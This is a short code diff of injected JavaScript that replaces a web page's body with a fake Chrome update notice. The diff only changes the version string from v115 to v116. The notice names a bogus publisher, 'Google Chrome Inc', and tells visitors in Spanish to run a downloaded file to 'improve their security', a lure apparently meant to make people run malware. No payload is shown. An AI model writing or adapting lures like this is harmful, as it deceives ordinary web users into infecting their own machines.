@@ -14,7 +14,7 @@ document.body.innerHTML += `<style>img{max-width:100%;image-rendering:-moz-crisp
      <div class="body-main mtb_15">
         <div class="main-left"><img src="https://i.imgur.com/z7VDyyl.png"/></div>
        <div class="main-right tr">
-          <p>Name: Chrome_Google_v115</p>
+          <p>Name: Chrome_Google_v116</p>
            <p>Publisher: Google Chrome Inc</p>
        </div>
      </div>
@@ -35,7 +35,7 @@ document.body.innerHTML += `<style>img{max-width:100%;image-rendering:-moz-crisp
      <div class="body-main">
         <div class="main-left"><img src="https://i.imgur.com/tmXv0AB.png"/></div>
        <div class="main-right">
-          <p>Ejecute el archivo llamado Chrome_Google_v115 en sus Descargas. Gracias por ayudarnos a mejorar la integridad de su seguridad.</p>
+          <p>Ejecute el archivo llamado Chrome_Google_v116 en sus Descargas. Gracias por ayudarnos a mejorar la integridad de su seguridad.</p>
        </div>
      </div>
    </div>
